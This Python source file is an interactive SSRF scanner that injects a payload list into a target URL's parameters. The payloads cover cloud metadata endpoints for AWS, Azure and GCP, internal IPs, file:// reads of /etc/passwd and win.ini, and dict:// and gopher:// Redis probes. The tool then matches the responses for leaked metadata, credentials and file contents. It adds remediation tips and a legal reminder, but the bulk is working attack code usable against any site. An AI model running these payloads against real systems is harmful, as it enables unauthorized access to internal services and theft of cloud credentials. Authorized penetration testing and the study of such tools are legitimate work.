import requests
import urllib.parse
from colorama import init, Fore, Style

init(autoreset=True)


def run():
    print(f"\n{Fore.CYAN}{'=' * 70}")
    print(f"{Fore.CYAN}║{Fore.GREEN}              SSRF VULNERABILITY SCANNER                           {Fore.CYAN}║")
    print(f"{Fore.CYAN}{'=' * 70}{Style.RESET_ALL}")

    target = input(
        f"\n{Fore.YELLOW}Enter target URL with parameters (e.g., http://site.com/fetch?url=http://example.com): {Style.RESET_ALL}").strip()

    if not target:
        print(f"\n{Fore.RED}[!] Empty input. Aborting.{Style.RESET_ALL}")
        input(f"\n{Fore.BLUE}Press Enter to return to menu...{Style.RESET_ALL}")
        return

    if not target.startswith(('http://', 'https://')):
        print(f"\n{Fore.RED}[!] URL must start with http:// or https://{Style.RESET_ALL}")
        input(f"\n{Fore.BLUE}Press Enter to return to menu...{Style.RESET_ALL}")
        return

    print(f"\n{Fore.CYAN}[+] Analyzing URL parameters for SSRF vulnerability{Style.RESET_ALL}")

    parsed = urllib.parse.urlparse(target)
    query_params = urllib.parse.parse_qs(parsed.query)

    if not query_params:
        print(
            f"\n{Fore.RED}[!] No URL parameters found. SSRF testing requires parameters like ?url= or ?image={Style.RESET_ALL}")
        input(f"\n{Fore.BLUE}Press Enter to return to menu...{Style.RESET_ALL}")
        return

    print(f"\n{Fore.GREEN}[✓] Found parameters: {list(query_params.keys())}{Style.RESET_ALL}")

    ssrf_params = []
    ssrf_indicators = ['url', 'image', 'img', 'source', 'link', 'proxy', 'target', 'redirect', 'next', 'host',
                       'callback', 'api']

    for param in query_params.keys():
        if any(ind in param.lower() for ind in ssrf_indicators):
            ssrf_params.append(param)

    if not ssrf_params:
        print(f"\n{Fore.YELLOW}[i] No obvious SSRF parameters detected. Testing all parameters...{Style.RESET_ALL}")
        ssrf_params = list(query_params.keys())

    base_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"

    print(f"\n{Fore.CYAN}{'=' * 70}")
    print(f"{Fore.CYAN}SSRF TESTING RESULTS")
    print(f"{Fore.CYAN}{'=' * 70}{Style.RESET_ALL}")

    vulnerable = False
    payloads = [
        ("http://localhost:80", "Local web service"),
        ("http://127.0.0.1:22", "SSH service banner"),
        ("http://169.254.169.254/latest/meta-data/", "AWS EC2 Metadata (CRITICAL)"),
        ("http://169.254.169.254/metadata/v1/", "Azure Instance Metadata"),
        ("http://metadata.google.internal/computeMetadata/v1/", "Google Cloud Metadata"),
        ("http://192.168.1.1", "Common router IP"),
        ("http://10.0.0.1", "Internal network IP"),
        ("http://172.17.0.1", "Docker host IP"),
        ("file:///etc/passwd", "Local file read (Linux)"),
        ("file:///c:/windows/win.ini", "Local file read (Windows)"),
        ("dict://127.0.0.1:6379/info", "Redis server info"),
        ("gopher://127.0.0.1:6379/_INFO", "Redis via Gopher")
    ]

    for param in ssrf_params:
        print(f"\n{Fore.CYAN}[→] Testing parameter: {param}{Style.RESET_ALL}")

        for payload_url, description in payloads:
            test_params = query_params.copy()
            test_params[param] = [payload_url]
            test_query = urllib.parse.urlencode(test_params, doseq=True)
            test_url = f"{base_url}?{test_query}"

            try:
                headers = {'Metadata': 'true'} if '169.254.169.254' in payload_url else {}
                response = requests.get(test_url, timeout=10, verify=False, headers=headers, allow_redirects=False)

                indicators = {
                    "AWS Metadata": ["ami-id", "instance-id", "security-credentials"],
                    "Azure Metadata": ["compute", "network", "platform"],
                    "GCP Metadata": ["project", "instance", "attributes"],
                    "Redis": ["redis_version", "used_memory", "+OK", "ERR wrong number"],
                    "Linux File": ["root:x:", "daemon:x:", "bin:x:"],
                    "Windows File": ["[extensions]", "[fonts]", "for 16-bit app support"],
                    "Router": ["<title>Login</title>", "username", "password", "router"],
                    "SSH Banner": ["OpenSSH", "SSH-"]
                }

                for vuln_type, patterns in indicators.items():
                    if any(pattern in response.text for pattern in patterns) and response.status_code != 404:
                        vulnerable = True
                        severity = Fore.RED
                        if vuln_type in ["AWS Metadata", "Azure Metadata", "GCP Metadata"]:
                            severity = Fore.MAGENTA + Style.BRIGHT
                            print(f"{severity}[!] CRITICAL SSRF: {vuln_type} via {param}{Style.RESET_ALL}")
                        else:
                            print(f"{severity}[!] SSRF DETECTED: {vuln_type} via {param}{Style.RESET_ALL}")
                        print(f"    Payload: {payload_url}")
                        print(f"    Description: {description}")
                        print(f"    Status: {response.status_code}")

                        snippet = response.text[:300]
                        if vuln_type == "AWS Metadata":
                            print(f"    {Fore.YELLOW}  CLOUD METADATA EXPOSED - IMMEDIATE RISK{Style.RESET_ALL}")
                        elif vuln_type == "Redis":
                            print(f"    {Fore.YELLOW}  DATABASE ACCESSIBLE - HIGH RISK{Style.RESET_ALL}")
                        if snippet:
                            print(f"    Response snippet: {snippet[:200]}...")
                        break

            except requests.exceptions.Timeout:
                continue
            except Exception:
                continue

    print(f"\n{Fore.CYAN}{'=' * 70}")
    print(f"{Fore.CYAN}SSRF TESTING COMPLETE")
    print(f"{Fore.CYAN}{'=' * 70}{Style.RESET_ALL}")

    if vulnerable:
        print(f"\n{Fore.MAGENTA}{Style.BRIGHT}[!] CRITICAL SSRF VULNERABILITIES DETECTED{Style.RESET_ALL}")
        print(f"\n{Fore.YELLOW}Risk Level: CRITICAL{Style.RESET_ALL}")
        print(f"   • Attackers can access internal networks and cloud metadata")
        print(f"   • Full cloud instance compromise possible via metadata APIs")
        print(f"   • Internal services (databases, admin panels) exposed")
        print(f"   • Potential for remote code execution in some cases")

        print(f"\n{Fore.YELLOW}Immediate Recommendations:{Style.RESET_ALL}")
        print(f"   • Block all external URLs in user input")
        print(f"   • Use allowlist validation for URLs (only trusted domains)")
        print(f"   • Disable URL schemas: file://, dict://, gopher://, etc.")
        print(f"   • Implement network segmentation (block metadata IPs at firewall)")
        print(f"   • For cloud environments:")
        print(f"        - AWS: Enable IMDSv2 with hop limit 1")
        print(f"        - Azure/GCP: Restrict metadata access via IAM policies")
        print(f"   • Use dedicated proxy services with strict validation")
        print(f"   • Monitor for SSRF attempts in logs")
    else:
        print(f"\n{Fore.GREEN}[✓] No obvious SSRF vulnerabilities detected{Style.RESET_ALL}")
        print(f"\n{Fore.YELLOW}Important Notes:{Style.RESET_ALL}")
        print(f"   • SSRF is context-dependent - false negatives common")
        print(f"   • Test with authenticated sessions")
        print(f"   • Check for blind SSRF (out-of-band detection needed)")
        print(f"   • Advanced payloads may bypass basic filters")
        print(f"   • Manual testing highly recommended for critical systems")

    print(f"\n{Fore.CYAN}{'=' * 70}")
    print(f"{Fore.GREEN}[✓] SSRF analysis completed{Style.RESET_ALL}")
    print(f"{Fore.CYAN}{'=' * 70}{Style.RESET_ALL}")
    print(f"\n{Fore.YELLOW}⚠️  LEGAL REMINDER:{Style.RESET_ALL}")
    print(f"   SSRF exploitation without authorization carries severe penalties.")
    print(f"   Always obtain written permission before testing internal systems.")

    input(f"\n{Fore.BLUE}Press Enter to return to menu...{Style.RESET_ALL}")